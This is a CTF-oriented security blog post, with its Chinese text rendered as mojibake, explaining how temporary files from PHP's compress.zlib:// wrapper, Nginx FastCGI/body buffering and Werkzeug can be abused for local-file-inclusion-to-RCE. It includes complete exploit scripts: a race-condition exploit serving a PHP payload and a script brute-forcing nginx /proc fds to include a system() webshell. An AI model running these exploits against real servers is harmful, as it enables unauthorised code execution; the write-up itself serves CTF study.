---
title: "è¯·æ±‚æ—¶äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶åŠå…¶åˆ©ç”¨"
slug: "tmp-file-while-request"
description: "ä¹å–„å¯é™ˆï¼Œæ°´ä¸€ç¯‡"
date: 2023-03-14T18:04:28+08:00
categories: ["NOTES&SUMMARY"]
series: []
tags: ["upload"]
draft: false
toc: true
---

å‘¨ä¸€å¤ç°hxp2022å‘ç°åˆåˆ©ç”¨äº†ä¸Šä¼ äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶è¿™ä¸€æ‹›äº†ï¼Œæ­£å¥½2021å¹´çš„the end of lfiä¹Ÿæœ‰ç‚¹å¿˜äº†ï¼Œå†é‡å­¦ä¸€æ‰‹ï¼›å‚è€ƒé“¾æ¥è§æ–‡æœ«

----

## PHP - compress.zlib://

åœ¨[php-src](https://github.dev/php/php-src)é‡Œå¯ä»¥æ‰¾åˆ°å’Œ`compress.zlib://`æœ‰å…³çš„ä»£ç  | [code](https://github.dev/php/php-src/blob/master/ext/zlib/zlib_fopen_wrapper.c#L122)

![image-20230313141706354](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313141706354.png)

æ³¨æ„åˆ°`STREAM_WILL_CAST`ï¼Œæ¶‰åŠåˆ°castç»å¸¸ä¼šæœ‰ä¸€äº›å®‰å…¨éšæ‚£ï¼ˆæº¢å‡ºï¼ŒæŠ¥é”™ç­‰ï¼‰ï¼›çœ‹ä¸€ä¸‹è¿™ä¸ªå®çš„å…·ä½“å«ä¹‰ | [code](https://github.dev/php/php-src/blob/master/main/php_streams.h#L539)

![image-20230313142020053](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313142020053.png)

å¦‚æœä¼ å…¥è¿™ä¸ªflagé‚£å°†ä¸ä¼šå¯ç”¨ç¼“å†²æœºåˆ¶æ¥è¯»å–headersï¼Œå³ é»˜è®¤æƒ…å†µä¸‹å¼€å§‹ç¼“å†²æœºåˆ¶

æ¥ç€çœ‹ä»£ç ï¼Œæ¥æ”¶è¿™ä¸ªå®çš„å‡½æ•°æ˜¯`_php_stream_open_wrapper_ex` | [code](https://github.dev/php/php-src/blob/master/main/streams/streams.c#L2120)

![image-20230313143718213](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313143718213.png)

æ¶‰åŠåˆ°`_php_stream_make_seekable`å‡½æ•° | [code](https://github.dev/php/php-src/blob/master/main/streams/cast.c#L370)

![image-20230313144406452](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313144406452.png)

å…¶å®æ•´ä¸ªè¿‡ç¨‹å¾ˆé¡ºï¼Œå› ä¸ºæœ€åˆçš„`STREAM_WILL_CAST`å°±æ˜¯é»˜è®¤é€‰é¡¹ï¼Œæ‰€ä»¥ä¸éœ€è¦æˆ‘ä»¬åœ¨æµä¼ è¾“ä¸­å†åŠ å¹²æ¶‰å°±å¯ä»¥ç”Ÿæˆä¸´æ—¶æ–‡ä»¶

æœ€ç®€å•çš„ç¤ºä¾‹ä»£ç ï¼ˆ*åˆ©ç”¨å‰æï¼šç›®æ ‡æœåŠ¡å™¨å¼€å¯`allow_url_fopen`, `allow_url_include`ï¼‰

```php
<?php
putenv("TMPDIR=/var/www/html/files");	// è®¾ç½®ç”Ÿæˆç¼“å­˜æ–‡ä»¶çš„ç›®å½•
file_get_contents("compress.zlib://https://www.baidu.com");
```

```bash
cd /var/www/html
chattr -R +a files	# ç¦æ­¢ä¸´æ—¶æ–‡ä»¶åˆ é™¤
fswatch files		# ç›‘è§†æ–‡ä»¶å˜åŠ¨
cd files & cat *
```

å¯ä»¥çœ‹åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­å°±æ˜¯baiduçš„é¦–é¡µå†…å®¹

å› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·çš„æ€è·¯ï¼Œç”¨`compress.zlib://evil_url`æ¥ä¼ evil_codeï¼Œå¯ä»¥ç”¨pwntoolsåº“æ¥æ§åˆ¶å…·ä½“ä¼ è¾“çš„å†…å®¹ï¼›åŒæ—¶å› ä¸ºä¸´æ—¶æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨åˆ é™¤ï¼Œæˆ‘ä»¬å¯ä»¥å†™å…¥å¤§é‡åƒåœ¾å†…å®¹ æˆ–ç”¨`compress.zlib://ftp://`æ¥æ§åˆ¶ä¼ è¾“é€Ÿç‡æ¥ä¿æŒè¿æ¥

### [36c3 2019]includer

```php
<?php
declare(strict_types=1);

$rand_dir = 'files/'.bin2hex(random_bytes(32));
mkdir($rand_dir) || die('mkdir');
putenv('TMPDIR='.__DIR__.'/'.$rand_dir) || die('putenv');
echo 'Hello '.$_POST['name'].' your sandbox: '.$rand_dir."\n";

try {
    if (stripos(file_get_contents($_POST['file']), '<?') === false) {
        include_once($_POST['file']);
    }
}
finally {
    system('rm -rf '.escapeshellarg($rand_dir));
}
```

æœ‰äº†ä¸Šé¢çš„é“ºå«è¿™é‡Œå°±æ¸…æ™°å¾ˆå¤šï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåˆ©ç”¨`compress.zlib://http://xxxxxx`ä¸Šä¼ å«evil codeçš„å¤§æ–‡ä»¶ä»¥æ­¤æ¥ç”Ÿæˆç¼“å­˜æ–‡ä»¶ï¼Œç„¶åå†è®©å…¶è¢«åŒ…å«æ‰§è¡Œ æœ€ç»ˆgetflag

ä½†é¢˜ç›®ä¸­å¤šäº†ä¸å°‘é™åˆ¶ï¼Œé¦–å…ˆæ˜¯`rand_dir`è®©æˆ‘ä»¬ä¸çŸ¥é“ç¼“å­˜æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ è¿™ä¼šå½±å“åˆ°åé¢çš„rceï¼›é”™è¯¯çš„é…ç½®æ–‡ä»¶å¯ä»¥è§£å†³è¿™ä¸€é—®é¢˜

```
location /.well-known {
  autoindex on;
  alias /var/www/html/well-known/;
}
```

å€Ÿæ­¤æˆ‘ä»¬å¯ä»¥éå†åˆ°ä¸Šå±‚æ–‡ä»¶å¤¹ï¼Œä½†æ¯æ¬¡æ‰§è¡Œåæ–‡ä»¶åéƒ½æ˜¯éšæœºçš„ï¼Œ

å…¶æ¬¡éœ€è¦æ»¡è¶³çš„æ¡ä»¶æ˜¯`stripos(file_get_contents($_POST['file']), '<?') === false`ï¼Œä¹Ÿå°±æ˜¯ä¼ è¾“çš„å†…å®¹ä¸­ä¸èƒ½åŒ…å«`<?`ï¼Œè¿™å¯¹phpæ¥è¯´ç®€ç›´æ˜¯è‡´å‘½æ‰“å‡»

å¯¹äºè¿™ä¸€é—®é¢˜ æ ‡ç­”æ˜¯<u>race condition</u>ï¼Œåˆ©ç”¨`file_get_contents`å’Œ`include_once`æ‰§è¡Œè¿‡ç¨‹ä¸­å¾®å¼±çš„æ—¶é—´çª—å£æ¥ç»•è¿‡ï¼Œå³ï¼šå…ˆå‘é€åƒåœ¾æ•°æ®ï¼Œé€šè¿‡ifåˆ¤æ–­åå†ä¼ evil code

```python
from pwn import *
import requests
import re
import threading
import time


for gg in range(100):

    r = remote("192.168.34.1", 8004)
    l = listen(8080)

    data = '''name={}&file=compress.zlib://http://192.168.151.132:8080'''.format("a"*8050)

    payload = '''POST / HTTP/1.1
Host: 192.168.34.1:8004
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Content-Length: {}
Content-Type: application/x-www-form-urlencoded
Connection: close
Cookie: PHPSESSID=asdasdasd
Upgrade-Insecure-Requests: 1
{}'''.format(len(data), data).replace("\n","\r\n")


    r.send(payload)
    try:
        r.recvuntil('your sandbox: ')
    except EOFError:
        print("[ERROR]: EOFERROR")
        # l.close()
        r.close()
        continue
    # dirname = r.recv(70)
    dirname = r.recvuntil('\n', drop=True) + '/'

    print("[DEBUG]:" + dirname)

    # send trash
    c = l.wait_for_connection()
    resp = '''HTTP/1.1 200 OK
Date: Sun, 29 Dec 2019 05:22:47 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 534
Content-Type: text/html; charset=UTF-8
{}'''.format('A'* 5000000).replace("\n","\r\n")
    c.send(resp)


    # get filename
    r2 = requests.get("http://192.168.34.1:8004/.well-known../"+ dirname + "/")
    try:
        tmpname = "php" + re.findall(">php(.*)<\/a",r2.text)[0]
        print("[DEBUG]:" + tmpname)
    except IndexError:
        l.close()
        r.close()
        print("[ERROR]: IndexErorr")
        continue
    def job():
        time.sleep(0.01)
        phpcode = 'wtf<?php system("/readflag");?>';
        c.send(phpcode)

    t = threading.Thread(target = job)
    t.start()

    # file_get_contents and include tmp file
    exp_file = dirname + "/" + tmpname
    print("[DEBUG]:"+exp_file)
    r3 = requests.post("http://192.168.34.1:8004/", data={'file':exp_file})
    print(r3.status_code,r3.text)
    if "wtf" in r3.text:
        break

    t.join()
    r.close()
    l.close()
    #r.interactive()
```

## Nginx FastCGI

åœ¨Nginxæ–‡æ¡£ä¸­æœ‰è¿™æ ·çš„éƒ¨åˆ†ï¼š[fastcgi_buffering](http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering)ï¼ŒNginxæ¥æ”¶æ¥è‡ªFastCGIçš„å“åº” å¦‚æœå†…å®¹è¿‡å¤§ï¼Œé‚£å®ƒçš„ä¸€éƒ¨åˆ†å°±ä¼šè¢«å­˜å…¥ç£ç›˜ä¸Šçš„ä¸´æ—¶æ–‡ä»¶ï¼Œè€Œè¿™ä¸ªé˜ˆå€¼å¤§æ¦‚åœ¨32kbbå·¦å³

é‚£è¿™ä¸ªè¢«å†™å…¥ä¸´æ—¶æ–‡ä»¶çš„â€œä¸€éƒ¨åˆ†â€åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç®€å•éªŒè¯ä¸€ä¸‹

```python
with open("tmp", "w") as file:
	for i in range(500000):
		file.write("%5s" % str(i))
```

![image-20230314160944526](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230314160944526.png)

æ³¨æ„åˆ°è¿™é‡Œç¡®å®å‡ºç°äº†fastcgiç›¸å…³çš„æ–‡ä»¶å˜åŠ¨ï¼Œåœ¨`/var/lib/nginx/fastcgi/`ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬å’Œä¸Šé¢ç”¨ä¸€æ ·çš„æ–¹å¼æ¥çœ‹çœ‹æ–‡ä»¶å†…å®¹

![image-20230314161838519](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230314161838519.png)

å°´å°¬äº†ï¼Œå³ä½¿æˆ‘å·²ç»è®¾ç½®è¿‡fastcgiç›®å½•çš„æƒé™äº† ä½†è¿˜æ˜¯é˜»æ­¢ä¸äº†unlinkï¼ˆå¦‚æœæˆ‘è‡ªå·±æ–°å»ºä¸€ä¸ª`./8/00`ä¹Ÿä¸€æ ·ä¼šæŠ¥é”™ï¼‰ï¼Œè¿™é‡Œå°±åªèƒ½äº‘äº†

![image-20230314162150447](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230314162150447.png)

é‚£è¿™ä¸ªè¢«å¿«é€Ÿåˆ é™¤çš„ä¸´æ—¶æ–‡ä»¶å¯ä»¥åƒä¸Šé¢ä¸€æ ·ç”¨race conditionæ¥åˆ©ç”¨å—ï¼Ÿè¿™å°±åªèƒ½çœ‹Nginxçš„å…·ä½“å®ç°äº† | [code](https://github.dev/nginx/nginx/blob/master/src/os/unix/ngx_files.c#L277)

![image-20230314162607872](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230314162607872.png)

å¦‚æœpersistentä½ä¸ºfalseå°±ä¼šåˆ é™¤æ–‡ä»¶ï¼ˆfdæ¡ä»¶ä¸€å®šæ»¡è¶³ï¼‰ï¼Œä¸€è·¯é¡ºç€æ‰¾è°ƒç”¨ä¼šå‘ç°å®ƒå°±æ˜¯request_body_in_persistent_fileï¼ˆä»£ç ä¸å¤šï¼Œç›´æ¥é™æ€æœå¼•ç”¨å°±è¡Œ ~~ï¼ˆç»å¯¹ä¸æ˜¯æˆ‘æ‡’~~

https://github.dev/nginx/nginx/blob/master/src/http/ngx_http_request_body.c#L556

![image-20230314163343648](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230314163343648.png)

![image-20230314163650412](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230314163650412.png)

ç„¶è€Œé»˜è®¤éƒ½æ˜¯1 ä¸”æ²¡æœ‰å¯ä»¥è‡ªå®šä¹‰çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯è¯´é™¤éä¿®æ”¹é»˜è®¤é…ç½® å¦åˆ™ä¸å¯èƒ½ä¸åˆ é™¤äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶

ä¸è¿‡ä¸é‡è¦ï¼Œåœ¨ä¸€åˆ‡çš†fileçš„linuxé‡Œè¿˜æœ‰`/proc/PID/fd/`ä¼šå­˜æœ‰å½“å‰è¿è¡Œè¿›ç¨‹/çº¿ç¨‹çš„ä¿¡æ¯ï¼›å°è¯•ç”¨ä¸‹é¢çš„ä»£ç æ¨¡æ‹ŸNginxå¯¹ä¸´æ—¶æ–‡ä»¶çš„å¤„ç†è¡Œä¸º

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <error.h>
#include <unistd.h>

int main() {
    puts("[+] test for open/unlink/write [+]\n");
    int fd = open("test.txt", O_CREAT|O_EXCL|O_RDWR, 0600);
    printf("open file with fd %d,try unlink\n",fd);

    unlink("test.txt");
    printf("unlink file, try write content\n");	// unlink ä½†ç»§ç»­å‘fdä¸­è¿›è¡Œå†™æ“ä½œ
    if(write(fd, "<?php phpinfo();?>", 19) != 19)
    {
        printf("write file error!\n");
    }

    char buffer[20] = {0};
    lseek(fd, 0,SEEK_SET);
    int size = read(fd, buffer , 19);
    printf("read size is %d\n",size);
    printf("read buffer is %s\n",buffer);

    while(1) {
        sleep(10);	// æ¨¡æ‹Ÿè¿›ç¨‹æŒ‚èµ·
    }
    // close(fd);
    return 0;
}
```

![image-20230314165337847](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230314165337847.png)

å¯ä»¥çœ‹åˆ°unlinkæ‰§è¡Œä¹‹åâ€œæ–‡ä»¶â€ä¾ç„¶å­˜åœ¨äº/proc/PID/fd/3ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å†™å…¥å¹¶è¢«phpåŒ…å«`include '/proc/xxx/fd/3';`

*æ³¨æ„è¿™é‡Œä¸´æ—¶æ–‡ä»¶çš„äº§ç”Ÿä¹Ÿå’Œä¸Šé¢çš„phpæœ‰ä¸€æ ·çš„è¡Œä¸ºï¼Œå¯¹äºè¿‡å¤§çš„Request Bodyä¹Ÿä¼šäº§ç”Ÿä¸´æ—¶æ–‡ä»¶ï¼Œä¸å¤šèµ˜è¿°

### [hxp 2021]Includer's revenge

```php
<?php
($_GET['action'] ?? 'read' ) === 'read' ? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');
```

æœ‰ç‚¹æ£˜æ‰‹çš„æ˜¯ç”Ÿæˆç¼“å­˜æ–‡ä»¶çš„procç›®å½•ã€pidæˆ‘ä»¬éƒ½ä¸çŸ¥é“ï¼Œ ä¹Ÿæ²¡æœ‰ä¸Šä¸€é“é¢˜é‡Œçš„ç›®å½•éå†ï¼Œåªèƒ½çˆ†ç ´äº†

æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ï¼š

1. è¯·æ±‚ä¸€ä¸ªphpå¤§æ–‡ä»¶äº§ç”Ÿfastcgiç¼“å­˜
2. çˆ†ç ´/proc/pid/fd/æ‰¾åˆ°è¢«åˆ é™¤çš„æ–‡ä»¶
3. å¤šé‡é“¾æ¥ç»•è¿‡include_onceï¼Œrce

exp.py

```python
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes
r  = requests.get(URL, params={
    'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'file': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'file': f,
                'c': f'id'
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()
```

## Flask - werkzeug

werkzeug åœ¨å­˜åœ¨è¿™æ ·çš„ä»£ç  | [code](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/formparser.py#L56)

![image-20230313104035742](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313104035742.png)

`SpooledTemporaryFile` å’Œ `TemporaryFile` éƒ½æ˜¯å¸¦æœ‰è‡ªåŠ¨æ¸…ç†åŠŸèƒ½çš„æ¥å£ï¼Œæ–‡æ¡£ä¸­è¿™æ ·æè¿°

![image-20230313105243489](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313105243489.png)

![image-20230313105415243](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20230313105415243.png)

æˆ‘ä»¬æœ‰äº†åœ¨æœåŠ¡å™¨ä¸Šå†™å…¥ä»»æ„æ–‡ä»¶çš„èƒ½åŠ›

### [hxp 2022]sqlite_web

æ˜¨å¤©åˆšå†™è¿‡ï¼Œ[wp](https://amiaaaz.github.io/2023/03/13/hxpctf2021-wp/#websqlite_web)

{{% spoiler "ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ" %}}

[36c3 Web/Includer-wp by balsn](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer)

[PHP LFI with Nginx Assistance](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)

[Solving "includer's revenge" from hxp ctf 2021 without controlling any files](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)

[hxp CTF 2021 - A New Novel LFI](https://tttang.com/archive/1384/)

[hxp CTF 2021 - The End Of LFI?](https://tttang.com/archive/1395/)

{{% /spoiler %}}
